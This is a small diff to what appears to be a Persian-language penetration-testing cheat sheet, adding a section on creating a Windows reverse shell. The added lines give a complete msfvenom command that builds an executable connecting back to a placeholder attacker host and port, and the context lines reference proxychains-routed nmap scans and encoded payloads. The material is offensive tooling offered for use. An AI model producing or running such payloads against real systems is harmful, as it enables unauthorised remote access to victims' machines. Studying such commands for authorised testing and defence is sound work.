@@ -438,6 +438,11 @@ proxychains nmap -sT -p80,443 3.3.3.3
 cb.exe
 ```
 
+### ایجاد reverse shell برای ویندوز با msfvenom
+
+
+```msfvenom -p windows/shell_reverse_tcp lhost=ip lport=port -f exe --platform windows >reverse.exe```
+
 ### ایجاد پیلود انکد شده با استفاده از  msfvenom
 
 ```text
